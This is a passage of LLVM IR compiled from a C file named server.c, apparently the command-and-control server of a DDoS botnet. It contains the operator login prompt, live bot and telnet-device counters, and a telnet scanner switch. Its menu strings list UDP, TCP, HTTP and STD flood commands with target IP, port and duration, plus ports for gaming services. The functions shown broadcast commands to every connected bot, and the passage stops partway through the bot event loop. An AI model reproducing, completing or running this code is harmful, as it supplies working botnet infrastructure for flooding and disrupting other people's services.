; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"\0D\0A\1B[32mLinux~: \00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.17 = private unnamed_addr constant [47 x i8] c"%c]0;Bots Connected: %d | User(s) Online: %d%c\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.18 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.20 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [22 x %struct.login_info] zeroinitializer, align 16
@.str.21 = private unnamed_addr constant [22 x i8] c"\1B[37mLogin ID: \1B[30m \00", align 1
@.str.22 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.23 = private unnamed_addr constant [22 x i8] c"\1B[37mPasscode: \1B[30m \00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [48 x i8] c"\1B[31mIP Logged, Disconnecting From Session...\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [92 x i8] c"\1B[32m  ######  ##    ## ########  ######## ########  \1B[31m##      ##    ###    ########  \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [92 x i8] c"\1B[32m ##    ##  ##  ##  ##     ## ##       ##     ## \1B[31m##  ##  ##   ## ##   ##     ## \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [92 x i8] c"\1B[32m ##         ####   ##     ## ##       ##     ## \1B[31m##  ##  ##  ##   ##  ##     ## \0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [92 x i8] c"\1B[32m ##          ##    ########  ######   ########  \1B[31m##  ##  ## ##     ## ########  \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [92 x i8] c"\1B[32m ##          ##    ##     ## ##       ##   ##   \1B[31m##  ##  ## ######### ##   ##   \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [92 x i8] c"\1B[32m ##    ##    ##    ##     ## ##       ##    ##  \1B[31m##  ##  ## ##     ## ##    ##  \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [158 x i8] c"\1B[32m  ######     ##    ########  ######## ##     ##  \1B[31m###  ###  ##     ## ##     ##                                                                   \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [82 x i8] c"\1B[31m     _____________________________________________________________________\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"\1B[30m \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [74 x i8] c"                              \1B[37m \1B[37m[ \1B[32mYour ID: \1B[31m%s\1B[37m ]\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [84 x i8] c"                          \1B[37m \1B[37m[ \1B[32mOpen Main Menu With: \1B[31mMenu\1B[37m ]\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"\1B[37mLinux~:\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"Bots\00", align 1
@.str.39 = private unnamed_addr constant [68 x i8] c"Bots Connected: [\1B[32m %d \1B[37m] | Users Online: [\1B[32m %d \1B[37m]\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"Stat\00", align 1
@.str.41 = private unnamed_addr constant [62 x i8] c"Telnet Devices: [\1B[32m %d \1B[37m] | Status: [\1B[32m %d \1B[37m]\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"Menu\00", align 1
@.str.43 = private unnamed_addr constant [54 x i8] c"\0D\0A\1B[37m[ \1B[32mYou Have Opened The Menu, %s \1B[37m]\0D\0A\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [68 x i8] c"\1B[32m#   \1B[32m UDP Attack: \1B[32m!* UDP [IP] [Port] [Time] 32 0 10\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [72 x i8] c"\1B[32m#   \1B[32m TCP Attack: \1B[32m!* TCP [IP] [Port] [Time] 32 all 0 10\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [56 x i8] c"\1B[32m#   \1B[32m HTTP Attack: \1B[32m!* HTTP [Url] [Time]\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [60 x i8] c"\1B[32m#   \1B[32m STD Attack: \1B[32m!* STD [IP] [Port] [Time]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [12 x i8] c"   \1B[30m \0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"   \1B[32m  ---------------------------------------------------------------\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Main Menu:     \1B[31m[ \1B[32mMenu  \1B[31m]\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Bot Count:     \1B[31m[ \1B[32mBots  \1B[31m]\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Telnet Status: \1B[31m[ \1B[32mStat  \1B[31m]\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Logout:        \1B[31m[ \1B[32mLog   \1B[31m]\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Kill Attack:   \1B[31m[ \1B[32mKill  \1B[31m]\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Clear Screen:  \1B[31m[ \1B[32mClear \1B[31m]\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Credits:       \1B[31m[ \1B[32mCreds \1B[31m]\0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [7 x i8] c"Hidden\00", align 1
@.str.58 = private unnamed_addr constant [50 x i8] c"   \0D\0A\1B[32m[\1B[32m You Must Be A 1337 ;) \1B[32m]\0D\0A\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [56 x i8] c"   \1B[32m UDP - \1B[32m!* UDP [IP] [Port] [Time] 32 0 10\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [60 x i8] c"   \1B[32m TCP - \1B[32m!* TCP [IP] [Port] [Time] 32 all 0 10\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [44 x i8] c"   \1B[32m HTTP - \1B[32m!* HTTP [Url] [Time]\0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [48 x i8] c"   \1B[32m STD - \1B[32m!* STD [IP] [PORT] [TIME]\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"Kill\00", align 1
@.str.64 = private unnamed_addr constant [19 x i8] c"\1B[32m!* KILLATTK\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [6 x i8] c"Clear\00", align 1
@.str.66 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"Creds\00", align 1
@.str.68 = private unnamed_addr constant [57 x i8] c"\0D\0A\1B[34mCredits-> \1B[32mMade By Vendettxs On Instagram\0D\0A\0D\0A\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"Ports\00", align 1
@.str.70 = private unnamed_addr constant [98 x i8] c"\0D\0A\1B[37mPORTS: \1B[31mXBOX Services: 3074 | PSN Services: 443 | DEFAULT: 80 | DNS/Nameserver: 53\0D\0A\0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"Log\00", align 1
@.str.72 = private unnamed_addr constant [40 x i8] c"Terminating Session. Logging Out ID: %s\00", align 1
@.str.73 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.74 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.76 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.78 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.80 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.81 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.83 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"FBI\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.88 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.90 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %104, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %107

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %59, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 1
  %47 = load i8, i8* %46, align 4
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %60, label %49

49:                                               ; preds = %42
  %50 = load i32, i32* %7, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %59, label %52

52:                                               ; preds = %49
  %53 = load i32, i32* %12, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %54
  %56 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

59:                                               ; preds = %52, %49, %38
  br label %104

60:                                               ; preds = %52, %42
  %61 = load i32, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %80

63:                                               ; preds = %60
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %66, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %80

70:                                               ; preds = %63
  %71 = load i32, i32* %12, align 4
  %72 = call i64 @send(i32 %71, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i64 5, i32 16384)
  %73 = load i32, i32* %12, align 4
  %74 = load i8*, i8** %6, align 8
  %75 = load i8*, i8** %6, align 8
  %76 = call i64 @strlen(i8* %75) #8
  %77 = call i64 @send(i32 %73, i8* %74, i64 %76, i32 16384)
  %78 = load i32, i32* %12, align 4
  %79 = call i64 @send(i32 %78, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %80

80:                                               ; preds = %70, %63, %60
  %81 = load i32, i32* %12, align 4
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %81)
  %83 = load i32, i32* %12, align 4
  %84 = load i8*, i8** %4, align 8
  %85 = load i8*, i8** %4, align 8
  %86 = call i64 @strlen(i8* %85) #8
  %87 = call i64 @send(i32 %83, i8* %84, i64 %86, i32 16384)
  %88 = load i32, i32* %7, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %100

90:                                               ; preds = %80
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %92
  %94 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 4
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %100

97:                                               ; preds = %90
  %98 = load i32, i32* %12, align 4
  %99 = call i64 @send(i32 %98, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i64 13, i32 16384)
  br label %103

100:                                              ; preds = %90, %80
  %101 = load i32, i32* %12, align 4
  %102 = call i64 @send(i32 %101, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i64 1, i32 16384)
  br label %103

103:                                              ; preds = %100, %97
  br label %104

104:                                              ; preds = %103, %59
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %12, align 4
  br label %35, !llvm.loop !11

107:                                              ; preds = %35
  %108 = load i8*, i8** %8, align 8
  call void @free(i8* %108) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %21 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %1, %297
  %24 = load volatile i32, i32* @epollFD, align 4
  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 %24, %struct.epoll_event* %25, i32 1000000, i32 -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %294, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %297

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 1
  store i8 0, i8* %68, align 4
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 %75)
  br label %294

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %186

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %87, %151, %154, %178
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 %89, %struct.sockaddr* %8, i32* %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %185

102:                                              ; preds = %97
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  br label %185

103:                                              ; preds = %88
